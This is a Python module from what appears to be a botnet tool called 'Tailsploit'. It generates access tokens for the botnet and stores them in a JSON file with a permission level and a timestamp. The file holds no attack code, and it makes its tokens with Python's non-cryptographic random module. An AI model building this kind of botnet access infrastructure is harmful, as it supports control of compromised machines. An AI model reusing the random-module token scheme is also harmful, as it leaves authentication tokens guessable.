# lib/authentication/hashkey.py

import random
import string
import json
import os
import time

def OnGenerateAuthenticationBotnetKey(length=16, prefix="TAILSPLOIT?TOKEN="):
    characters = string.ascii_letters + string.digits
    key = ''.join(random.choice(characters) for _ in range(length))
    return prefix + key

def OnAppendBotnetKey(json_file, key_data):
    json_file_path = os.path.abspath(json_file)
    
    if not os.path.exists(json_file_path) or os.path.getsize(json_file_path) == 0:
        data = []
    else:
        with open(json_file_path, 'r') as file:
            data = json.load(file)

    next_id = len(data) + 1
    key_data["id"] = next_id

    data.append(key_data)

    with open(json_file_path, 'w') as file:
        json.dump(data, file, indent=1)
    
def GenerateHashkeyRequest(length, permission, custom_path="../../lib/authentication/"):
    generated_key = OnGenerateAuthenticationBotnetKey(length)
    if custom_path:
        json_file = os.path.join(custom_path, 'hash-token.json')
    else:
        json_file = 'hash-token.json'

    key_data = {
        "token": generated_key,
        "createdTime": time.strftime("%Y/%m/%d %H:%M:%S"),
        "status": "active",
        "permission": permission
    }
    OnAppendBotnetKey(json_file, key_data)
    return generated_key
